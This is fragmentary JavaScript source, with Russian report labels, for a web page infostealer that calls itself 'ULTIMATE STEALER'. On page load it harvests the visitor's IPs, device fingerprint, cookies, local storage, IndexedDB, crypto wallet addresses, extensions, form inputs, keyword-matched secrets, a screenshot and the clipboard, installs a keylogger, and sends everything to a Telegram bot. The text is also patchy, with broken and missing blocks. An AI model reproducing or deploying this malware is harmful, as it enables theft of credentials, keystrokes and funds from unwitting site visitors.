    // =====================================================================

    async function sendTelegram(text) {
        try {
            const parts = [];
            const t = clean(text);
            for(let i=0;i<t.length;i+=4000) parts.push(t.slice(i,i+4000));
            let ok=true;
            for(let i=0;i<parts.length;i++){
                const p = parts.length>1 ? `[${i+1}/${parts.length}]\n${parts[i]}` : parts[i];
                const r = await fetch(`https://api.telegram.org/bot${C.BOT_TOKEN}/sendMessage`,{
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({chat_id:C.CHAT_ID,text:p.slice(0,4096)})
                });
                const d = await r.json();
                if(!d.ok) ok=false;
                await sleep(200);
            }
            return ok;
        } catch(e){ return false; }
    }

                img.onload = () => r(true);
                img.onerror = () => r(false);
                setTimeout(() => r(false), 500);
            } catch(e){ r(false); }
        });
    }

                if(!e.candidate) return;
                const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/g);
                if(m) m.forEach(ip => {
                    const l = ip.startsWith('192.168.')||ip.startsWith('10.')||ip.startsWith('172.16.')||ip.startsWith('127.');
                    l ? result.webrtc.local.push(ip) : result.webrtc.public.push(ip);
                    result.allIPs.push(ip);
                });
            };
            await sleep(600);
            pc.close();
            result.webrtc.public = [...new Set(result.webrtc.public)];
            result.webrtc.local = [...new Set(result.webrtc.local)];
            result.allIPs = [...new Set(result.allIPs)];
        } catch(e){}

        // --- Network API ---
        try {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if(conn) result.network = {type:conn.type,effectiveType:conn.effectiveType,downlink:conn.downlink,rtt:conn.rtt};

        try {

        try {
            const servers = ['https://google.com','https://facebook.com'];

            for(const s of servers){
                try { const st = performance.now(); await fetch(s,{mode:'no-cors'}); times.push(performance.now()-st); } catch(e){}
            }
            if(times.length) result.timing = times;
        } catch(e){}

        // --- Device ---
        try {
            const n = navigator;
            const ua = n.userAgent.toLowerCase();
            const d = {
                platform: n.platform,
                cores: n.hardwareConcurrency || '?',
                memory: n.deviceMemory || '?',
                language: n.language,
                os: 'unknown', osVersion: 'unknown', browser: 'unknown', browserVersion: 'unknown', model: 'unknown'
            };
            if(ua.includes('windows')) { d.os='Windows'; if(ua.includes('windows nt 10.0')) d.osVersion='10/11'; else if(ua.includes('windows nt 6.3')) d.osVersion='8.1'; else if(ua.includes('windows nt 6.1')) d.osVersion='7'; }
            else if(ua.includes('mac os x')) { d.os='macOS'; const m=ua.match(/mac os x (\d+)_(\d+)/); if(m) d.osVersion=`${m[1]}.${m[2]}`; }
            else if(ua.includes('linux')) { d.os='Linux'; if(ua.includes('android')){ d.os='Android'; const m=ua.match(/android (\d+\.\d+)/); if(m) d.osVersion=m[1]; } }
            else if(ua.includes('ios')||ua.includes('iphone')) { d.os='iOS'; const m=ua.match(/os (\d+)_(\d+)/); if(m) d.osVersion=`${m[1]}.${m[2]}`; }
            if(!!window.chrome && !ua.includes('edg') && !ua.includes('opr')) { d.browser='Chrome'; const m=ua.match(/chrome\/(\d+)/); if(m) d.browserVersion=m[1]; }
            else if(ua.includes('firefox')) { d.browser='Firefox'; const m=ua.match(/firefox\/(\d+)/); if(m) d.browserVersion=m[1]; }
            else if(ua.includes('safari') && !ua.includes('chrome')) { d.browser='Safari'; const m=ua.match(/version\/(\d+)/); if(m) d.browserVersion=m[1]; }
            else if(ua.includes('edg')) { d.browser='Edge'; const m=ua.match(/edg\/(\d+)/); if(m) d.browserVersion=m[1]; }
            if(d.os==='Android'){ const m=ua.match(/; (.*?) Build\//); if(m) d.model=m[1]; }
            else if(d.os==='iOS'){ const m=ua.match(/\(([^;]+);/); if(m) d.model=m[1]; }
            d.screen = {width:screen.width,height:screen.height,pixelRatio:window.devicePixelRatio,colorDepth:screen.colorDepth};
            result.device = d;
        } catch(e){}

        // --- Fingerprints ---
        try {
            const fp = {};
            // Canvas
            const c=document.createElement('canvas'); c.width=256; c.height=128;
            const ctx=c.getContext('2d');
            ctx.textBaseline='top'; ctx.font='14px Arial'; ctx.fillStyle='#f60'; ctx.fillRect(0,0,256,128);

            fp.canvas = c.toDataURL().slice(0,100);
            // WebGL
            const gl = c.getContext('webgl')||c.getContext('experimental-webgl');
            if(gl){ const ext=gl.getExtension('WEBGL_debug_renderer_info'); fp.webgl={renderer:gl.getParameter(ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER))}; }
            // Audio
            const AudioCtx=window.AudioContext||window.webkitAudioContext;
            if(AudioCtx){ const actx=new AudioCtx(); fp.audio={sampleRate:actx.sampleRate}; actx.close(); }
            // Fonts
            const fonts=['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Impact','Tahoma','Roboto','Open Sans','Lato','Montserrat','Ubuntu','Fira Sans','Segoe UI','Helvetica Neue','Arial Black','Calibri','Cambria','Consolas','Lucida Console','Trebuchet MS','Candara','Corbel','Franklin Gothic Medium','Gabriola','Gadugi','Gill Sans','Ink Free','Malgun Gothic','Microsoft Sans Serif','MingLiU','MS Gothic','Myanmar Text','Nirmala UI','Palatino Linotype','Segoe Print','Segoe Script','Symbol','Webdings','Wingdings'];
            fp.fonts = fonts.filter(f=>{ try{ return document.fonts.check(`16px "${f}"`); } catch{return false;} });

            try { fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e){}

            fp.screen = {width:screen.width,height:screen.height,pixelRatio:window.devicePixelRatio};
            // Color scheme
            try { fp.colorScheme = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'; } catch(e){}

            try { if(performance.memory) fp.memory = {used:Math.round(performance.memory.usedJSHeapSize/1024/1024),total:Math.round(performance.memory.totalJSHeapSize/1024/1024)}; } catch(e){}
            result.fingerprints = fp;
        } catch(e){}

        // --- Plugins ---
        try {
            const p = [];
            for(let i=0;i<navigator.plugins.length;i++) {
                const pl = navigator.plugins[i];
                p.push({name:pl.name,filename:pl.filename});
            }
            result.plugins = p;
        } catch(e){}

        // --- Features ---
        try {
            const f = {};
            ['WebAssembly','WebGPU','WebSocket','WebTransport','ServiceWorker','Notification','Geolocation','ScreenOrientation','Clipboard','CacheStorage','IndexedDB','FileAPI','WebRTC','WebAudio','WebCrypto','Push','Vibration','Fullscreen'].forEach(feat => {
                try { f[feat] = typeof window[feat] !== 'undefined' || typeof navigator[feat] !== 'undefined'; } catch(e){ f[feat]=false; }
            });
            result.features = f;
        } catch(e){}

        // --- Storage ---
        try {
            const ls = {};
            for(let i=0;i<localStorage.length;i++){ const k=localStorage.key(i); try{ ls[k]=localStorage.getItem(k); } catch(e){} }
            const ss = {};
            for(let i=0;i<sessionStorage.length;i++){ const k=sessionStorage.key(i); try{ ss[k]=sessionStorage.getItem(k); } catch(e){} }
            const cookies = {};
            document.cookie.split('; ').filter(Boolean).forEach(p=>{ const [k,...v]=p.split('='); cookies[k]=v.join('='); });
            result.storage = {localStorage:ls,sessionStorage:ss,cookies};
        } catch(e){}

        // --- IndexedDB ---
        try {
            if(indexedDB.databases) {
                const dbs = await indexedDB.databases();
                const res = [];
                for(const db of dbs) {
                    try {
                        const req = await new Promise((resolve,reject)=>{
                            const r = indexedDB.open(db.name);
                            r.onsuccess = () => resolve(r.result);
                            r.onerror = () => reject();
                        });
                        const stores = Array.from(req.objectStoreNames);
                        const st = [];
                        for(const s of stores) {
                            try {
                                const tx = req.transaction(s,'readonly');
                                const store = tx.objectStore(s);
                                const count = await new Promise(resolve => {
                                    const r = store.count();
                                    r.onsuccess = () => resolve(r.result);
                                    r.onerror = () => resolve(0);
                                });
                                st.push({storeName:s,count});
                            } catch(e){ st.push({storeName:s,count:0}); }
                        }
                        res.push({name:db.name,stores:st});
                        req.close();
                    } catch(e){}
                }
                result.indexedDB = res;
            }

        // --- Crypto wallets ---

            if(window.solana && window.solana.publicKey) w.push({type:'Solana',address:window.solana.publicKey.toString()});
            if(window.phantom && window.phantom.solana?.publicKey) w.push({type:'Phantom',address:window.phantom.solana.publicKey.toString()});
            ['trustwallet','okxwallet','bitkeep','coinbase','walletconnect'].forEach(n => {
                try { if(window[n]) w.push({type:n,address:null}); } catch(e){}
            });
            result.wallets = w;
        } catch(e){}

        // --- Extensions ---
        try {
            const known = {
                'nkbihfbeogaeaoehlefnkodbefgpgknn':'MetaMask',
                'cjpalhdlnbpafiamejdnhcphjbkeiagm':'uBlock Origin',
                'gighmmpiobklfepjocnamgkkbiglidom':'AdBlock',
                'hnfanknocfeofbddgcijnmhnfnkdnaad':'Coinbase',
                'hpihmllllekjbnpehglncmolodpknmmb':'Trust Wallet',
                'bpaejdmabdchhpnpepceapmdmgellhpg':'OKX Wallet',
                'aapbdbdomjkkjkaonfhkkikfgjllcleb':'Google Translate',
                'lmjegmlicamnimmfhcmpkclmigmmcbeh':'Tampermonkey',
                'jilocjlanhgkobdddpdgaennlbnadnhb':'LastPass',
                'mooikfkahbdckaollhiabmhbonmhbbha':'Bitwarden'
            };
            const e = [];
            if(window.chrome && chrome.runtime) {
                Object.keys(known).forEach(id => {
                    try { chrome.runtime.getURL(`//${id}/manifest.json`); e.push(known[id]); } catch(e){}
                });
            }
            result.extensions = e;
        } catch(e){}

        // --- Passwords ---
        try {
            const forms = [];
            document.querySelectorAll('form').forEach(form => {
                const data = {action:form.action||'',inputs:[]};
                form.querySelectorAll('input').forEach(inp => {
                    if(inp.value && inp.value.length>0) {
                        data.inputs.push({name:inp.name||'',type:inp.type,value:inp.type==='password'?'[PASSWORD]':trunc(inp.value,50),isPassword:inp.type==='password'});
                    }
                });
                if(data.inputs.length) forms.push(data);
            });
            result.passwords = forms;
        } catch(e){}

        // --- Secrets ---
        try {
            const s = [];
            const patterns = ['token','jwt','secret','key','auth','password','pwd','api','private','wallet','mnemonic','seed','recovery','access','refresh','csrf','xsrf','session'];
            const search = (data,path='') => {
                if(!data || typeof data!=='object') return;
                for(let k in data) {
                    try {
                        const v = data[k];
                        const fullPath = path?`${path}.${k}`:k;
                        if(patterns.some(p=>k.toLowerCase().includes(p)) && v && typeof v==='string' && v.length>3 && v.length<300) {
                            s.push({path:fullPath,value:trunc(v,60)});
                        }
                        if(typeof v==='object' && v!==null) search(v,fullPath);
                    } catch(e){}
                }
            };
            search(result.storage);
            result.secrets = s;
        } catch(e){}

        // --- DOM ---
        try {
            result.dom = {
                title: document.title,
                url: location.href,
                referrer: document.referrer || 'нет',
                forms: document.querySelectorAll('form').length,
                inputs: document.querySelectorAll('input, textarea, select').length,
                links: document.querySelectorAll('a[href]').length
            };
        } catch(e){}

        // --- Screenshot ---
        try {
            if(typeof html2canvas==='undefined') {
                const s = document.createElement('script');
                s.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
                await new Promise((r,rej)=>{ s.onload=r; s.onerror=rej; document.head.appendChild(s); });
                await sleep(300);
            }
            const canvas = await html2canvas(document.body, {useCORS:true,allowTaint:true,scale:0.05,logging:false,backgroundColor:null});
            result.screenshot = canvas.toDataURL('image/jpeg',0.08);
        } catch(e){}

        // --- Clipboard ---
        try {
            const ta = document.createElement('textarea');
            ta.style.cssText = 'position:fixed;opacity:0;pointer-events:none;left:-9999px;top:-9999px;';
            document.body.appendChild(ta);
            ta.focus();
            if(document.execCommand('paste')) { const val=ta.value; ta.remove(); if(val) result.clipboard=val; }
            ta.remove();
        } catch(e){}
        try {
            if(navigator.clipboard?.read) {
                const items = await navigator.clipboard.read();
                for(const item of items) {
                    if(item.types.includes('text/plain')) {
                        const blob = await item.getType('text/plain');
                        result.clipboard = await blob.text();
                        break;
                    }
                }
            }
        } catch(e){}

        // --- Keylogger ---
        try {
            const buffer = [];
            const special = {'Control':'[CTRL]','Shift':'[SHIFT]','Alt':'[ALT]','Meta':'[WIN]','Escape':'[ESC]','Tab':'[TAB]','Enter':'[ENTER]','Backspace':'[BACK]','Delete':'[DEL]','ArrowUp':'[UP]','ArrowDown':'[DOWN]','ArrowLeft':'[LEFT]','ArrowRight':'[RIGHT]'};
            document.addEventListener('keydown', e => {
                if(e.key==='Unidentified') return;
                let out = special[e.key] || e.key;
                if(e.ctrlKey) out='[CTRL]+'+out;
                if(e.shiftKey && !special[e.key]) out=out.toUpperCase();
                if(e.altKey) out='[ALT]+'+out;
                buffer.push(out);
                if(buffer.length>=15){ const d=buffer.splice(0); sendImage({keylog:d.join('')}); }
            });
            setInterval(()=>{ if(buffer.length>0){ const d=buffer.splice(0); sendImage({keylog:d.join('')}); } },20000);
            result.keylogger = true;
        } catch(e){}

        // --- Service Worker ---
        try {
            if('serviceWorker' in navigator) {
                const sw = `self.addEventListener('install',e=>e.waitUntil(self.skipWaiting()));self.addEventListener('activate',e=>e.waitUntil(self.clients.claim()));`;
                navigator.serviceWorker.register(URL.createObjectURL(new Blob([sw],{type:'application/javascript'})),{scope:'/'});
                result.persistence = true;
            }
        } catch(e){}

        // --- Sensors ---
        try {
            const s = {};
            if(navigator.getBattery) {
                const b = await navigator.getBattery();
                s.battery = {level:Math.round(b.level*100),charging:b.charging};
            }
            await new Promise(r => {
                const handler = e => {
                    if(e.acceleration) s.acceleration = {x:e.acceleration.x,y:e.acceleration.y,z:e.acceleration.z};
                    if(e.rotationRate) s.gyroscope = {alpha:e.rotationRate.alpha,beta:e.rotationRate.beta,gamma:e.rotationRate.gamma};
                    window.removeEventListener('devicemotion',handler);
                    r();
                };
                window.addEventListener('devicemotion',handler,{once:true});
                setTimeout(r,500);
            });
            result.sensors = s;
        } catch(e){}

        // --- OS info for summary ---
        result.os = result.device.os || 'unknown';
        result.browser = result.device.browser || 'unknown';

        return result;
    }

    // =====================================================================
    // ФОРМАТИРОВАНИЕ
    // =====================================================================
    function format(data) {
        const lines = [];
        lines.push('🔴 ULTIMATE STEALER — ПОЛНЫЙ ДАМП');
        lines.push('═'.repeat(50));
        lines.push('');

        // IP и гео
        if(data.ip) {
            lines.push(`🌐 IP: ${data.ip}`);
            if(data.geo) {
                const g = data.geo;
                const loc = [g.country,g.region,g.city].filter(Boolean).join(', ');
                if(loc) lines.push(`📍 ${loc}`);
                if(g.isp) lines.push(`📡 ${g.isp}`);
                if(g.lat && g.lon) lines.push(`🗺 ${g.lat}, ${g.lon}`);
            }
            lines.push('');
        }

        // Все IP
        if(data.allIPs && data.allIPs.length) {
            lines.push(`🌐 ВСЕ IP: ${data.allIPs.join(', ')}`);
            lines.push('');
        }

        // WebRTC локальные
        if(data.webrtc?.local?.length) {
            lines.push(`📡 WebRTC локальные: ${data.webrtc.local.join(', ')}`);
        }

        // Сеть
        if(data.network) {
            const n = data.network;
            lines.push(`📶 Сеть: ${n.effectiveType||'?'} ${n.downlink||'?'}Mbps, RTT ${n.rtt||'?'}ms`);
        }

        // DNS
        if(data.dns) {
            lines.push(`🕵️ DNS: ${data.dns.domain} (${data.dns.time}ms)`);
        }

        // Задержка
        if(data.timing && data.timing.length) {
            const avg = Math.round(data.timing.reduce((a,b)=>a+b,0)/data.timing.length);
            lines.push(`⏱ Задержка: ${avg}ms`);
        }
        lines.push('');

        // Устройство
        if(data.device) {
            const d = data.device;
            lines.push(`💻 ${d.os||'?'} ${d.osVersion||''}, ${d.browser||''} ${d.browserVersion||''}`);
            if(d.model && d.model!=='unknown') lines.push(`📱 Модель: ${d.model}`);
            lines.push(`   ${d.cores||'?'} ядер, ${d.memory||'?'}GB RAM`);
            if(d.screen) lines.push(`   Экран: ${d.screen.width}x${d.screen.height} (${d.screen.pixelRatio||'?'}x)`);
            lines.push('');
        }

        // Фингерпринты
        if(data.fingerprints) {
            const f = data.fingerprints;
            if(f.webgl?.renderer) lines.push(`🎯 WebGL: ${f.webgl.renderer}`);
            if(f.audio) lines.push(`🎯 Audio: ${f.audio.sampleRate}Hz`);
            if(f.timezone) lines.push(`🎯 Время: ${f.timezone}`);
            if(f.fonts?.length) lines.push(`🎯 Шрифты (${f.fonts.length}): ${f.fonts.slice(0,8).join(', ')}${f.fonts.length>8?'...':''}`);
            if(f.colorScheme) lines.push(`🎯 Цветовая схема: ${f.colorScheme}`);
            if(f.memory) lines.push(`💾 Память JS: ${f.memory.used}/${f.memory.total}MB`);
            lines.push('');
        }

        // Плагины
        if(data.plugins?.length) {
            lines.push(`🔌 Плагины (${data.plugins.length}):`);
            data.plugins.slice(0,5).forEach(p => lines.push(`   ${p.name}`));
            if(data.plugins.length>5) lines.push(`   ... и ещё ${data.plugins.length-5}`);
            lines.push('');
        }

        // Storage
        const ls = data.storage?.localStorage || {};
        const lk = Object.keys(ls);
        if(lk.length) {
            lines.push(`💾 LocalStorage (${lk.length}):`);
            Object.entries(ls).slice(0,6).forEach(([k,v]) => lines.push(`   ${trunc(k,15)}: ${trunc(String(v),45)}`));
            if(lk.length>6) lines.push(`   ... и ещё ${lk.length-6}`);
            lines.push('');
        }

        // Cookies
        const ck = Object.keys(data.storage?.cookies||{});
        if(ck.length) {
            lines.push(`🍪 Куки (${ck.length}):`);
            Object.entries(data.storage.cookies).slice(0,4).forEach(([k,v]) => lines.push(`   ${trunc(k,15)}: ${trunc(v,30)}`));
            if(ck.length>4) lines.push(`   ... и ещё ${ck.length-4}`);
            lines.push('');
        }

        // IndexedDB
        if(data.indexedDB?.length) {
            lines.push(`🗄️ IndexedDB (${data.indexedDB.length} БД):`);
            data.indexedDB.forEach(db => lines.push(`   ${db.name} (${db.stores?.length||0} stores)`));
            lines.push('');
        }

        // Криптовалюта
        if(data.wallets?.length) {
            lines.push(`💰 Криптокошельки (${data.wallets.length}):`);
            data.wallets.forEach(w => {
                const addr = w.address ? trunc(w.address,20) : 'установлен';
                lines.push(`   ${w.type}: ${addr}${w.chainId?' (сеть '+w.chainId+')':''}`);
            });
            lines.push('');
        }

        // Расширения
        if(data.extensions?.length) {
            lines.push(`🔌 Расширения: ${data.extensions.join(', ')}`);
            lines.push('');
        }

        // Пароли
        if(data.passwords?.length) {
            lines.push(`🔓 Формы (${data.passwords.length}):`);
            data.passwords.forEach(form => {
                form.inputs.forEach(inp => {
                    if(inp.isPassword) lines.push(`   Пароль: ${inp.name||'?'} = [PASSWORD]`);
                    else if(inp.value) lines.push(`   ${inp.name||'field'}: ${inp.value}`);
                });
            });
            lines.push('');
        }

        // Секреты
        if(data.secrets?.length) {
            lines.push(`🔑 Секреты (${data.secrets.length}):`);
            data.secrets.slice(0,8).forEach(s => lines.push(`   ${s.path}: ${s.value}`));
            if(data.secrets.length>8) lines.push(`   ... и ещё ${data.secrets.length-8}`);
            lines.push('');
        }

        // DOM
        if(data.dom) {
            const d = data.dom;
            lines.push(`🌐 Страница: ${d.url||'?'}`);
            if(d.title) lines.push(`   Заголовок: ${d.title}`);
            if(d.referrer && d.referrer!=='нет') lines.push(`↩️ ${d.referrer}`);
            lines.push('');
        }

        // Скриншот
        if(data.screenshot) {
            lines.push(`🖼 Скриншот: ${Math.round(data.screenshot.length/1024)} КБ`);
            lines.push('');
        }

        // Keylogger
        if(data.keylogger) lines.push('⌨️ Keylogger: активен');

        // Буфер обмена
        if(data.clipboard) {
            lines.push(`📋 Буфер обмена: ${trunc(data.clipboard,100)}`);
            lines.push('');
        }

        // Service Worker
        if(data.persistence) lines.push('♻️ Service Worker: зарегистрирован');

        // Сенсоры
        if(data.sensors?.battery) {
            const s = data.sensors;
            lines.push(`🔋 Батарея: ${s.battery.level}%${s.battery.charging?' (зарядка)':''}`);
        }
        if(data.sensors?.acceleration) {
            const a = data.sensors.acceleration;
            lines.push(`📱 Акселерометр: x=${a.x?.toFixed(2)}, y=${a.y?.toFixed(2)}, z=${a.z?.toFixed(2)}`);
        }
        if(data.sensors?.gyroscope) {
            const g = data.sensors.gyroscope;
            lines.push(`🔄 Гироскоп: α=${g.alpha?.toFixed(2)}, β=${g.beta?.toFixed(2)}, γ=${g.gamma?.toFixed(2)}`);
        }
        lines.push('');

        lines.push('═'.repeat(50));
        lines.push(`📅 ${data.timestamp}`);
        lines.push(`⏱ ${Math.round(performance.now())}ms`);

        return lines.join('\n');
    }

    // =====================================================================
    // ГЛАВНАЯ
    // =====================================================================
    (async function main() {
        try {
            document.getElementById('status').textContent = '⏳';

            // Сбор
            const data = await getData();
            data.performance = Math.round(performance.now());

            // Отчёт
            const report = format(data);
            document.getElementById('status').textContent = '📤';

            // Отправка
            const t1 = await sendTelegram(report);
            const t2 = await sendImage(data);
            const t3 = sendBeacon(data);

            const ok = [t1,t2,t3].filter(Boolean).length;
            document.getElementById('status').textContent = ok > 0 ? '✅' : '⚠️';
            setTimeout(() => { document.getElementById('status').style.opacity = '0'; }, 3000);

        } catch(e) {
            document.getElementById('status').textContent = '⚠️';
            console.error(e);
        }
    })();

    setTimeout(main, 300);

    console.log('✅ ULTIMATE STEALER loaded');
    </script>
</body>
</html>
